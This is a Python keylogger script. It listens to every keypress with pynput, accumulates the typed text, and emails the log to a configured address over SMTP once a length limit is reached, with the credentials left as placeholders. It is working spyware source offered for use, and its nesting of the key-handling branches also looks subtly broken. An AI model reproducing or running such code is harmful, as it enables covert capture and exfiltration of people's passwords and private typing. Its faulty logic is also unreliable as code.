import smtplib
from pynput.keyboard import Key, Listener


# set up email

email = "<paste_email_here>"
password = "<paste_password_here>"
smtp_server_adress = "<paste_smtp_address_here>"
smtp_server_port = "<paste_smtp_port_here>"
server = smtplib.SMTP_SSL(smtp_server_adress, smtp_server_port)
server.login(email, password)

# logger

full_log = ''
word = ''
email_char_limit = int("<paste_char_limit_here>")

def on_press(key):
    global word
    global full_log
    global email
    global email_char_limit

    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        if len(full_log) >= email_char_limit:
            send_log()
            full_log = ''
        elif key == Key.shift_l or key == Key.shift_r:
            return
        elif key == Key.backspace:
            word = word[:-1]
        else:
            char = f'{key}'
            char = char[1:-1]
            word += char
        if key == Key.esc:
            return False

def send_log():
    server.sendmail(
        email,
        email,
        full_log
    )


with Listener( on_press=on_press ) as listener:
    listener.join()